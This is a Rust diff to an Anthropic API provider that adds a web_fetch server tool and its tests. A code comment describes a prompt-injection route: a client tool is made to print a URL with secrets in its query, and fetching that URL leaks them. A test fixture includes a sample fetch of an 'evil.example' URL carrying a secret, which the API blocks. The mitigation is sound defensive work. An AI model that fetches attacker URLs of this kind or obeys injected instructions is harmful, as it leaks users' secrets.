@@ -168,17 +168,19 @@ impl AnthropicProvider {
     }
 }
 
-// The caller's tools plus any provider-side server tool the request asks for.
-// The server tool goes first so the caller's stable prefix keeps its order;
-// the cache boundary shifts with it.
+// The caller's tools plus any provider-side server tools the request asks for.
+// The server tools go first so the caller's stable prefix keeps its order;
+// the cache boundary shifts with them.
 fn tools_for(req: &Request<'_>, caps: ModelCaps) -> (Vec<serde_json::Value>, Option<usize>) {
     let mut tools = req.tools.clone();
     let mut boundary = req.tool_cache_boundary;
-    if req.web_search
-        && let Some(tool) = web_search_tool(caps)
-    {
-        tools.insert(0, tool);
-        boundary = boundary.map(|i| i + 1);
+    if req.web_search {
+        let server_tools: Vec<_> = [web_search_tool(caps), web_fetch_tool(caps)]
+            .into_iter()
+            .flatten()
+            .collect();
+        boundary = boundary.map(|i| i + server_tools.len());
+        tools.splice(0..0, server_tools);
     }
     (tools, boundary)
 }
@@ -212,25 +214,47 @@ fn complete_body(req: &Request<'_>, parts: WireParts) -> serde_json::Value {
     body
 }
 
-// Dynamic filtering (search results filtered by code before they reach
-// context) needs programmatic tool calling; without it the API rejects any
-// caller but "direct". "direct" stays allowed either way so the model can
-// still search without writing code.
+// Dynamic filtering (search or fetch results filtered by code before they
+// reach context) needs programmatic tool calling; without it the API rejects
+// any caller but "direct". "direct" stays allowed either way so the model can
+// still search and fetch without writing code.
+fn allowed_callers(caps: ModelCaps) -> serde_json::Value {
+    if caps.programmatic_tools {
+        json!(["direct", "code_execution_20260120"])
+    } else {
+        json!(["direct"])
+    }
+}
+
 fn web_search_tool(caps: ModelCaps) -> Option<serde_json::Value> {
     if !caps.web_search {
         return None;
     }
-    let allowed_callers = if caps.programmatic_tools {
-        json!(["direct", "code_execution_20260120"])
-    } else {
-        json!(["direct"])
-    };
     Some(json!({
         "type": "web_search_20260318",
         "name": "web_search",
         "max_uses": 5,
-        "allowed_callers": allowed_callers,
+        "allowed_callers": allowed_callers(caps),
         "response_inclusion": "excluded",
+    }))
+}
+
+// The Models API reports no fetch capability, so fetch rides on web search's.
+fn web_fetch_tool(caps: ModelCaps) -> Option<serde_json::Value> {
+    if !caps.web_search {
+        return None;
+    }
+    Some(json!({
+        "type": "web_fetch_20260318",
+        "name": "web_fetch",
+        "max_uses": 5,
+        "max_content_tokens": 25000,
+        "allowed_callers": allowed_callers(caps),
+        "response_inclusion": "excluded",
+        // A prompt injection could make a client tool (e.g. Bash) print a URL
+        // with secrets in its query string; fetching it would leak them from
+        // Anthropic's servers, past any local firewall.
+        "url_sources": { "client_tool_results": { "type": "none" } },
     }))
 }
 
@@ -778,19 +802,106 @@ mod tests {
     }
 
     #[test]
-    fn search_tool_goes_first_and_shifts_the_boundary() {
+    fn server_tools_go_first_in_order_and_shift_the_boundary() {
         let caps = ModelCaps {
             programmatic_tools: true,
             ..UNKNOWN_CAPS
         };
         let (tools, boundary) = tools_for(&request("m", true, &[]), caps);
         assert_eq!(tools[0]["type"], "web_search_20260318");
-        assert_eq!(tools[1]["name"], "Read");
-        assert_eq!(boundary, Some(1));
+        assert_eq!(
+            tools[1],
+            json!({"type": "web_fetch_20260318", "name": "web_fetch", "max_uses": 5,
+                   "max_content_tokens": 25000,
+                   "allowed_callers": ["direct", "code_execution_20260120"],
+                   "response_inclusion": "excluded",
+                   "url_sources": {"client_tool_results": {"type": "none"}}})
+        );
+        assert_eq!(tools[2]["name"], "Read");
+        assert_eq!(boundary, Some(2));
 
-        let (tools, boundary) = tools_for(&request("m", false, &[]), caps);
-        assert_eq!(tools.len(), 2);
-        assert_eq!(boundary, Some(0));
+        let (tools, _) = tools_for(&request("m", true, &[]), UNKNOWN_CAPS);
+        assert_eq!(tools[0]["allowed_callers"], json!(["direct"]));
+        assert_eq!(tools[1]["type"], "web_fetch_20260318");
+        assert_eq!(tools[1]["allowed_callers"], json!(["direct"]));
+
+        let no_search = ModelCaps {
+            web_search: false,
+            ..caps
+        };
+        for (web_search, caps) in [(false, caps), (true, no_search)] {
+            let (tools, boundary) = tools_for(&request("m", web_search, &[]), caps);
+            assert_eq!(tools.len(), 2);
+            assert_eq!(tools[0]["name"], "Read");
+            assert_eq!(boundary, Some(0));
+        }
+    }
+
+    const WEB_FETCH_RESPONSE: &str = r#"{
+        "content": [
+            {"type": "server_tool_use", "id": "srvtoolu_f1", "name": "web_fetch",
+             "input": {"url": "https://tokio.rs/blog/2026-10-tokio-1-50"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f1", "content": {
+                "type": "web_fetch_result", "url": "https://tokio.rs/blog/2026-10-tokio-1-50",
+                "content": {"type": "document",
+                            "source": {"type": "text", "media_type": "text/plain",
+                                       "data": "Tokio 1.50 released. This release adds..."},
+                            "title": "Announcing Tokio 1.50", "citations": {"enabled": false}},
+                "retrieved_at": "2026-11-08T10:00:00.000000+00:00"}},
+            {"type": "server_tool_use", "id": "srvtoolu_f2", "name": "web_fetch",
+             "input": {"url": "https://example.com/paper.pdf"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f2", "content": {
+                "type": "web_fetch_result", "url": "https://example.com/paper.pdf",
+                "content": {"type": "document",
+                            "source": {"type": "base64", "media_type": "application/pdf",
+                                       "data": "JVBERi0xLjQKJcOkw7zDtsOf"},
+                            "citations": {"enabled": false}},
+                "retrieved_at": "2026-11-08T10:00:01.000000+00:00"}},
+            {"type": "server_tool_use", "id": "srvtoolu_f3", "name": "web_fetch",
+             "input": {"url": "https://evil.example/?k=secret"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f3",
+             "content": {"type": "web_fetch_tool_result_error", "error_code": "url_not_in_prior_context"}},
+            {"type": "server_tool_use", "id": "srvtoolu_exec", "name": "code_execution",
+             "input": {"code": "r = await web_fetch({\"url\": \"https://tokio.rs/blog\"})\nprint(len(r))"}},
+            {"type": "server_tool_use", "id": "srvtoolu_f4", "name": "web_fetch",
+             "input": {"url": "https://tokio.rs/blog"},
+             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f4",
+             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"},
+             "content": {"type": "web_fetch_result", "url": "https://tokio.rs/blog",
+                         "content": {"type": "document",
+                                     "source": {"type": "text", "media_type": "text/plain", "data": "Blog"}},
+                         "retrieved_at": "2026-11-08T10:00:02.000000+00:00"}},
+            {"type": "code_execution_tool_result", "tool_use_id": "srvtoolu_exec",
+             "content": {"type": "code_execution_result", "stdout": "1",
+                         "stderr": "", "return_code": 0, "content": []}},
+            {"type": "text", "text": "Tokio 1.50 adds..."}
+        ],
+        "stop_reason": "end_turn",
+        "usage": {"input_tokens": 10, "output_tokens": 5}
+    }"#;
+
+    #[test]
+    fn web_fetch_blocks_round_trip_unchanged() {
+        let raw: serde_json::Value = serde_json::from_str(WEB_FETCH_RESPONSE).unwrap();
+        let resp: MessagesResponse = serde_json::from_str(WEB_FETCH_RESPONSE).unwrap();
+        assert_eq!(resp.content.len(), 11);
+        for (i, block) in resp.content.iter().enumerate() {
+            assert_eq!(
+                serde_json::to_value(block).unwrap(),
+                raw["content"][i],
+                "block {i} must round-trip"
+            );
+        }
+        for i in [1, 3, 5, 8] {
+            assert!(
+                matches!(&resp.content[i], ContentBlock::WebFetchToolResult { .. }),
+                "block {i}"
+            );
+        }
+        assert!(
+            matches!(&resp.content[8], ContentBlock::WebFetchToolResult { extra, .. } if extra.contains_key("caller"))
+        );
     }
 
     #[tokio::test]
@@ -814,6 +925,8 @@ mod tests {
         assert_eq!(body["thinking"]["type"], "enabled");
         assert_eq!(body["thinking"]["budget_tokens"], 8192);
         assert_eq!(body["tools"][0]["allowed_callers"], json!(["direct"]));
+        assert_eq!(body["tools"][1]["name"], "web_fetch");
+        assert_eq!(body["tools"][1]["allowed_callers"], json!(["direct"]));
     }
 
     #[test]
